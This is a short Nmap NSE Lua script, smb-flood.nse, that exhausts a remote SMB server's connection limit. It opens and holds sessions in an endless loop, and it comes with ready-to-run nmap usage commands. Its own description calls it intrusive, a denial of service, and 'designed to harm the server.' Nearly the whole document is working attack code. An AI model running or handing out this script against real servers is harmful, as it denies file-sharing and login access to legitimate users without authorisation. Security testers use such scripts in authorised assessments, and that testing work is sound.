local smb = require "smb"
local stdnse = require "stdnse"
local table = require "table"

description = [[
Exhausts a remote SMB server's connection limit by by opening as many
connections as we can.  Most implementations of SMB have a hard global
limit of 11 connections for user accounts and 10 connections for
anonymous. Once that limit is reached, further connections are
denied. This script exploits that limit by taking up all the
connections and holding them.

This works better with a valid user account, because Windows reserves
one slot for valid users. So, no matter how many anonymous connections
are taking up spaces, a single valid user can still log in.

This is *not* recommended as a general purpose script, because a) it
is designed to harm the server and has no useful output, and b) it
never ends (until timeout).
]]

---
-- @usage
-- nmap --script smb-flood.nse -p445 <host>
-- sudo nmap -sU -sS --script smb-flood.nse -p U:137,T:139 <host>
--
-- @output
-- n/a
-----------------------------------------------------------------------



author = "Ron Bowes"
copyright = "Ron Bowes"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive","dos"}
dependencies = {"smb-brute"}


hostrule = function(host)
	return smb.get_port(host) ~= nil
end

action = function(host)
	local states = {}
	repeat
		local status, result = smb.start_ex(host, true, true)
		if(status) then
			table.insert(states, result) -- Keep the result so it doesn't get garbage cleaned
			stdnse.print_debug(1, "smb-flood: Connection successfully opened")
			stdnse.sleep(.1)
		else
			stdnse.print_debug(1, "smb-flood: Connection failed: %s", result)
			stdnse.sleep(1)
		end
	until false
end

